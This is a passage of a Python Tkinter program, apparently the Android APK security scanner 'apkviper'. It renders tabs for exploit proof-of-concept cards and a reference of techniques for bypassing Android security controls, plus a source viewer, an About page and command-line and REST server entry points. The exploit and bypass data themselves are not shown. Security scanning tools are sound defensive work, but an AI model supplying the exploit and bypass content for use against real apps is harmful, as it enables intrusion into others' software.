    tk.Frame(ex_inner, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(0, 8))

    for i, ex in enumerate(EXPLOITS):
        card = make_card(ex_inner, px=20, py=16)
        card.pack(fill="x", padx=24, pady=6)
        # Header row
        hdr = tk.Frame(card, bg=BG_CARD)
        hdr.pack(fill="x", pady=(0, 8))
        tk.Label(hdr, text="{:02d}".format(i + 1), font=(MONO, 10, "bold"), bg=RED, fg="#ffffff",
                 padx=8, pady=2).pack(side="left", padx=(0, 10))
        tk.Label(hdr, text=ex["vuln"], font=(FONT, 13, "bold"), bg=BG_CARD, fg=FG, anchor="w").pack(side="left")
        tk.Label(hdr, text=ex["tool"], font=(MONO, 9), bg=BG_CARD, fg=FG2, anchor="e").pack(side="right")
        # Steps
        tk.Label(card, text="ATTACK STEPS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=ORANGE, anchor="w").pack(fill="x", pady=(4, 2))
        steps_text = tk.Text(card, bg=BG3, fg=FG, font=(MONO, 10), height=min(ex["steps"].count("\n") + 1, 6),
                             bd=0, wrap="word", padx=10, pady=8)
        steps_text.pack(fill="x", pady=2)
        steps_text.insert("1.0", ex["steps"])
        steps_text.configure(state="disabled")
        # PoC
        tk.Label(card, text="PROOF OF CONCEPT", font=(FONT, 9, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(fill="x", pady=(8, 2))
        poc_text = tk.Text(card, bg=BG3, fg=YELLOW, font=(MONO, 10), height=min(ex["poc"].count("\n") + 1, 8),
                           bd=0, wrap="word", padx=10, pady=8)
        poc_text.pack(fill="x", pady=2)
        poc_text.insert("1.0", ex["poc"])
        poc_text.configure(state="disabled")

    nb.add(ex_canvas, text="  \U0001f4a3  Exploits  ")
    _register_scrollable(3, ex_canvas, ex_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 4: BYPASS TECHNIQUES (Structured Cards)
    # ══════════════════════════════════════════════════════════
    by_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    by_inner = tk.Frame(by_canvas, bg=BG)
    by_sb = ttk.Scrollbar(by_canvas, orient="vertical", command=by_canvas.yview)
    by_canvas.configure(yscrollcommand=by_sb.set)
    by_sb.pack(side="right", fill="y"); by_canvas.pack(fill="both", expand=True)
    by_cw = by_canvas.create_window((0, 0), window=by_inner, anchor="nw")
    by_inner.bind("<Configure>", lambda e: by_canvas.configure(scrollregion=by_canvas.bbox("all")))
    by_canvas.bind("<Configure>", lambda e: by_canvas.itemconfig(by_cw, width=e.width))

    tk.Label(by_inner, text="Bypass Techniques Reference", font=(FONT, 18, "bold"),
             bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=24, pady=(24, 4))
    tk.Label(by_inner, text="{} techniques for bypassing Android security controls".format(len(BYPASS_TECHNIQUES)),
             font=(FONT, 11), bg=BG, fg=FG2, anchor="w").pack(fill="x", padx=24, pady=(0, 16))
    tk.Frame(by_inner, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(0, 8))

    cat_colors = {"Network": ACC, "Resilience": PURPLE, "Auth": ORANGE, "Code": YELLOW, "Platform": GREEN, "UI": RED}
    for i, bp in enumerate(BYPASS_TECHNIQUES):
        card = make_card(by_inner, px=20, py=16)
        card.pack(fill="x", padx=24, pady=6)
        hdr = tk.Frame(card, bg=BG_CARD)
        hdr.pack(fill="x", pady=(0, 8))
        cc = cat_colors.get(bp["category"], FG2)
        tk.Label(hdr, text=" {} ".format(bp["category"].upper()), font=(MONO, 9, "bold"),
                 bg=cc, fg="#000000" if bp["category"] in ("Auth", "Code") else "#ffffff",
                 padx=8, pady=2).pack(side="left", padx=(0, 10))
        tk.Label(hdr, text=bp["name"], font=(FONT, 13, "bold"), bg=BG_CARD, fg=FG, anchor="w").pack(side="left")
        tk.Label(card, text=bp["desc"], font=(FONT, 11), bg=BG_CARD, fg=FG2, anchor="w", wraplength=900).pack(fill="x", pady=(0, 8))
        tk.Label(card, text="METHODS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(fill="x", pady=(0, 2))
        m_text = tk.Text(card, bg=BG3, fg=FG, font=(MONO, 10), height=min(bp["methods"].count("\n") + 1, 6),
                         bd=0, wrap="word", padx=10, pady=8)
        m_text.pack(fill="x", pady=2)
        m_text.insert("1.0", bp["methods"])
        m_text.configure(state="disabled")

    nb.add(by_canvas, text="  \U0001f513  Bypass  ")
    _register_scrollable(4, by_canvas, by_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 5: SOURCE CODE VIEWER
    # ══════════════════════════════════════════════════════════
    source_frame = tk.Frame(nb, bg=BG)
    src_header = tk.Frame(source_frame, bg=BG2, height=36)
    src_header.pack(fill="x")
    src_header.pack_propagate(False)
    tk.Label(src_header, text="  \U0001f4c4  Source Code Viewer  \u2014  Select a file from the tree",
             font=(FONT, 10, "bold"), bg=BG2, fg=ACC, anchor="w").pack(fill="x", padx=8, pady=6)
    ct = scrolledtext.ScrolledText(source_frame, wrap="none", bg=BG2, fg=FG,
                                    font=(MONO, 11), state="disabled", bd=0, padx=12, pady=8)
    ct.pack(fill="both", expand=True)
    ct.tag_configure("keyword", foreground="#ff7b72", font=(MONO, 11, "bold"))
    ct.tag_configure("string", foreground="#a5d6ff")
    ct.tag_configure("comment", foreground="#6a7585", font=(MONO, 11, "italic"))
    ct.tag_configure("type", foreground="#d2a8ff")
    ct.tag_configure("number", foreground="#79c0ff")
    ct.tag_configure("annotation", foreground="#d29922")
    ct.tag_configure("xml_tag", foreground="#7ee787")
    ct.tag_configure("xml_attr", foreground="#d2a8ff")
    nb.add(source_frame, text="  \U0001f4c4  Source  ")
    source_tab_idx = 5

    def _syntax_highlight(widget):
        content = widget.get("1.0", "end")
        for kw in ["public", "private", "protected", "static", "final", "void", "class",
                    "interface", "extends", "implements", "import", "package", "return",
                    "new", "if", "else", "for", "while", "try", "catch", "throw", "throws",
                    "switch", "case", "break", "continue", "this", "super", "true", "false", "null"]:
            _tag_pattern(widget, r'\b' + kw + r'\b', "keyword")
        for tp in ["String", "int", "boolean", "long", "double", "float", "byte",
                    "Intent", "Bundle", "Context", "Activity", "Fragment", "View"]:
            _tag_pattern(widget, r'\b' + tp + r'\b', "type")
        _tag_pattern(widget, r'"[^"]*"', "string")
        _tag_pattern(widget, r'//.*$', "comment")
        _tag_pattern(widget, r'@\w+', "annotation")
        _tag_pattern(widget, r'\b\d+\b', "number")
        _tag_pattern(widget, r'</?[\w:]+', "xml_tag")
        _tag_pattern(widget, r'\w+(?==)', "xml_attr")

    def _tag_pattern(widget, pattern, tag):
        content = widget.get("1.0", "end")
        for match in re.finditer(pattern, content, re.MULTILINE):
            start = "1.0+{}c".format(match.start())
            end = "1.0+{}c".format(match.end())
            widget.tag_add(tag, start, end)

    # ══════════════════════════════════════════════════════════
    #  TAB 6: ABOUT
    # ══════════════════════════════════════════════════════════
    about_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    about_inner = tk.Frame(about_canvas, bg=BG)
    about_sb = ttk.Scrollbar(about_canvas, orient="vertical", command=about_canvas.yview)
    about_canvas.configure(yscrollcommand=about_sb.set)
    about_sb.pack(side="right", fill="y")
    about_canvas.pack(fill="both", expand=True)
    about_cw = about_canvas.create_window((0, 0), window=about_inner, anchor="nw")
    about_inner.bind("<Configure>", lambda e: about_canvas.configure(scrollregion=about_canvas.bbox("all")))
    about_canvas.bind("<Configure>", lambda e: about_canvas.itemconfig(about_cw, width=e.width))

    # About content
    tk.Label(about_inner, text="", bg=BG).pack(pady=8)
    tk.Label(about_inner, text="\U0001f40d", font=(FONT, 48), bg=BG, fg=ACC).pack()
    tk.Label(about_inner, text="{} v{}".format(APP_NAME, VERSION),
             font=(FONT, 24, "bold"), bg=BG, fg="#ffffff").pack(pady=(8, 2))
    tk.Label(about_inner, text="Android Application Security Scanner",
             font=(FONT, 13), bg=BG, fg=FG2).pack(pady=(0, 24))
    tk.Frame(about_inner, bg=BORDER, height=1).pack(fill="x", padx=80, pady=8)

    about_data = [
        ("Author", AUTHOR),
        ("Engine", "{} SAST Engine v2 + Taint Analysis".format(APP_NAME)),
        ("Rules", "{} pattern-based security rules".format(len(RULES))),
        ("Exploits", "{} exploit techniques with PoC".format(len(EXPLOITS))),
        ("Bypass", "{} bypass techniques".format(len(BYPASS_TECHNIQUES))),
        ("Reports", "HTML, JSON, CSV, SARIF 2.1.0"),
        ("Standards", "OWASP MASVS v2  |  MASTG  |  Mobile Top 10"),
        ("Compliance", "CWE/SANS  |  CVSS 3.1  |  NIST 800-53"),
        ("Regulation", "PCI-DSS  |  GDPR  |  SARIF 2.1.0"),
    ]
    for label, val in about_data:
        row = tk.Frame(about_inner, bg=BG)
        row.pack(fill="x", padx=80, pady=3)
        tk.Label(row, text=label, font=(FONT, 11, "bold"), bg=BG, fg=FG2,
                 anchor="e", width=14).pack(side="left")
        tk.Label(row, text="    " + val, font=(FONT, 11), bg=BG, fg=FG, anchor="w").pack(side="left")

    tk.Frame(about_inner, bg=BORDER, height=1).pack(fill="x", padx=80, pady=16)
    features = [
        "\u2705  Binary AndroidManifest.xml parser (AXML format)",
        "\u2705  DEX bytecode analysis for class and string extraction",
        "\u2705  Inter-procedural taint analysis (source \u2192 sink)",
        "\u2705  Exploit knowledge base with proof-of-concept code",
        "\u2705  Security control bypass techniques database",
        "\u2705  Session auto-save and restore",
        "\u2705  Syntax-highlighted source code viewer",
        "\u2705  REST API server for CI/CD integration",
        "\u2705  100% offline  |  Pure Python  |  Zero dependencies",
    ]
    for feat in features:
        tk.Label(about_inner, text="    " + feat, font=(FONT, 11), bg=BG, fg=FG, anchor="w").pack(fill="x", padx=80, pady=2)

    tk.Label(about_inner, text="", bg=BG).pack(pady=16)
    nb.add(about_canvas, text="  \u2139\ufe0f  About  ")
    _register_scrollable(6, about_canvas, about_inner)

    # ── Activate global mouse wheel scrolling for all canvas tabs ──
    root.bind_all("<MouseWheel>", _global_scroll)
    root.bind_all("<Button-4>", _global_scroll_up)
    root.bind_all("<Button-5>", _global_scroll_down)

    # ══════════════════════════════════════════════════════════
    #  STATUS BAR (Clean, no clock)
    # ══════════════════════════════════════════════════════════
    sv = tk.StringVar(value="\u25cf  Ready  \u2014  Open an APK to begin security assessment")
    status_bar = tk.Frame(root, bg=BG3, height=32)
    status_bar.pack(fill="x", side="bottom")
    status_bar.pack_propagate(False)
    tk.Label(status_bar, textvariable=sv, bg=BG3, fg=FG2, font=(FONT, 10),
             anchor="w", padx=16).pack(side="left", fill="x", expand=True)
    tk.Label(status_bar, text="{} v{}  |  {} rules  |  darkfox".format(APP_NAME, VERSION, len(RULES)),
             bg=BG3, fg=FG3, font=(FONT, 9), padx=16).pack(side="right")

    root.mainloop()

# ============================================================
#  MAIN
# ============================================================
def main():
    if len(sys.argv) > 1:
        a = sys.argv[1]
        if a == "--server":
            port = 8089
            if "--port" in sys.argv:
                i = sys.argv.index("--port")
                if i + 1 < len(sys.argv):
                    try: port = int(sys.argv[i + 1])
                    except: pass
            start_server(port); return
        if a == "--scan":
            p = argparse.ArgumentParser()
            p.add_argument("--scan", required=True)
            p.add_argument("--format", default="json", choices=["json", "html", "csv", "sarif"])
            p.add_argument("--output", default=None)
            sys.exit(cli_scan(p.parse_args()))
        if a in ("--help", "-h"):
            print("{} v{} - Android Security Assessment".format(APP_NAME, VERSION))
            print("\nUsage:")
            print("  python apkviper.py                          Launch GUI")
            print("  python apkviper.py --scan <apk>             Headless scan")
            print("  python apkviper.py --scan <apk> --format html --output report.html")
            print("  python apkviper.py --scan <apk> --format sarif")
            print("  python apkviper.py --server --port 8089     REST API")
            print("\nFeatures: 50 rules + taint analysis + exploit DB + bypass techniques")
            print("Formats: json, html, csv, sarif")
            print("Exit: 0=pass, 1=error, 2=critical/high"); return
    launch_gui()

if __name__ == "__main__":
    main()
